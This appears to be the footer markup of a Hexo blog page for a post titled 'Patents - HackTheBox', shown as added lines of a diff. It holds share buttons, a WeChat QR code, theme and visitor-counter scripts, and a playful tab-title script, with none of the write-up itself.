+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/&title=《Patents - HackTheBox》 — 喵喵喵喵&pic=https://darkwing.moe/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/&title=《Patents - HackTheBox》 — 喵喵喵喵&source=安全研究，懒，基本不自己写" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      <li>
+        <a class="facebook share-sns" target="_blank" href="https://www.facebook.com/sharer/sharer.php?u=https://darkwing.moe/2020/05/21/Patents-HackTheBox/" data-title=" Facebook">
+          <i class="icon icon-facebook"></i>
+        </a>
+      </li>
+      <li>
+        <a class="twitter share-sns" target="_blank" href="https://twitter.com/intent/tweet?text=《Patents - HackTheBox》 — 喵喵喵喵&url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/&via=https://darkwing.moe" data-title=" Twitter">
+          <i class="icon icon-twitter"></i>
+        </a>
+      </li>
+      <li>
+        <a class="google share-sns" target="_blank" href="https://plus.google.com/share?url=https://darkwing.moe/2020/05/21/Patents-HackTheBox/" data-title=" Google+">
+          <i class="icon icon-google-plus"></i>
+        </a>
+      </li>
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
+    <img src="data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAMYAAADGCAAAAACs8KCBAAACM0lEQVR42u3aS24bMRAFQN3/0hMgqwDOSO81JQMiiyvDsmdYWjT693jE5/p7kk+vf87Pv7l7zvXjPD5xMDAwvpZxPT13l7j79Pn/Pn9C/uT/UDEwMA5gJGG0DbjJ73PqiztjYGBglAG3vVwSfDEwMDBmpWmb5LWFLgYGBkZbxOZJ3qw0/aVaHAMD4wsZ7WDgN3/+4HwDAwPjSxjX8mlbac/Tu+EdMDAwtmbM0r73Btb1ASoGBsbejHddol0ma4cEL96LgYGxNSO/UB6gZyPMJFksBgMYGBjbMdaD3cp4sm20ReMBDAyMTRkrY8vZglfyzHp4iYGBsR2jTePaZlm7xjEEY2BgHMCIBoRxsyxvt81GobeDAQwMjE0ZbQKXN+mSL2XWhiuWLTAwMDZlzErctmG3vi72YuUCAwNjI8bsoW0BnATllS8CAwPjTEY7vFxf12iD+4vcFgMDYyNGsgYxW9Vq23YriSMGBsYJjNlZWeqaYer9EQwMjC0Y7Sgx/w5WFsLqJh0GBsbWjDzlmjXx85WL2VswMDBOYLQttpXWWP6utvTFwMDYm9GWmnlQTrY8ZpU0BgbGaYyrPOvjyTzdLMYVGBgYWzPeFa2T1li97PW5gSUGBsYXMmZFZpt1vmvV7BaJgYFxACMJo3nimDfU2qSznmxgYGAcycgHk22jP38+BgYGRvLQdgyQJ3/1nggGBsYxjFkR24bdfACQ3xYDA+MExspgIL9uPjZYKmUxMDB2Y/wBwm71Gyh5iNoAAAAASUVORK5CYII=" alt="微信分享二维码">
+</div>
+
+
+
+
+    <script src="//cdn.bootcss.com/node-waves/0.7.4/waves.min.js"></script>
+<script>
+var BLOG = { ROOT: '/', SHARE: true, REWARD: true };
+
+
+</script>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/main.min.js"></script>
+
+
+<div class="search-panel" id="search-panel">
+    <ul class="search-result" id="search-result"></ul>
+</div>
+<template id="search-tpl">
+<li class="item">
+    <a href="{path}" class="waves-block waves-effect">
+        <div class="title ellipsis" title="{title}">{title}</div>
+        <div class="flex-row flex-middle">
+            <div class="tags ellipsis">
+                {tags}
+            </div>
+            <time class="flex-col time">{date}</time>
+        </div>
+    </a>
+</li>
+</template>
+
+<script src="//unpkg.com/hexo-theme-material-indigo@latest/js/search.min.js" async></script>
+
+
+
+
+
+
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+
+
+<script>
+(function() {
+    var OriginTitile = document.title, titleTime;
+    document.addEventListener('visibilitychange', function() {
+        if (document.hidden) {
+            document.title = '死鬼去哪里了！';
+            clearTimeout(titleTime);
+        } else {
+            document.title = '(つェ⊂)咦!又好了!';
+            titleTime = setTimeout(function() {
+                document.title = OriginTitile;
+            },2000);
+        }
+    });
+})();
+</script>
+
+
+
+</body>
+</html>
